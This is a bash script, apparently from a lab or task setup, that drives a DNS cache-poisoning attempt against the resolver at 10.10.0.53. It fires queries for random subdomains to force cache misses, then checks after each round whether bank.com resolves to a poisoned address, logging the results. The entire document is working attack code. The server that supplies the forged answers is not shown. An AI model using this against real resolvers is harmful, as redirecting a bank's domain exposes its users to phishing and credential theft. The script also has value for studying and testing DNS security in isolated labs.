#!/bin/bash

RESOLVER="10.10.0.53"
TARGET_ZONE="${1:-example.net}"
ROUNDS="${2:-50}"
RESULT_FILE="/app/result.txt"

rm -f "$RESULT_FILE"

echo "[+] Triggering OoB attempts: zone=${TARGET_ZONE}, rounds=${ROUNDS}"

for i in $(seq 1 "$ROUNDS")
do
    QNAME="n${i}.$(date +%s%N).${TARGET_ZONE}"

    # Trigger cache miss so resolver must query authoritative server.
    dig @"$RESOLVER" "$QNAME" +tries=1 +time=1 +short > /dev/null
    sleep 0.05

    # Check if bank.com was poisoned into resolver cache.
    BANK_IP=$(dig @"$RESOLVER" bank.com +tries=1 +time=1 +short | head -n1 | tr -d '\r')
    if [ -z "$BANK_IP" ]; then
        BANK_IP="NOANSWER"
    fi

    echo "$BANK_IP" >> "$RESULT_FILE"
    echo "[$i/$ROUNDS] bank.com -> $BANK_IP"
done

echo "[+] Done. Results saved to $RESULT_FILE"
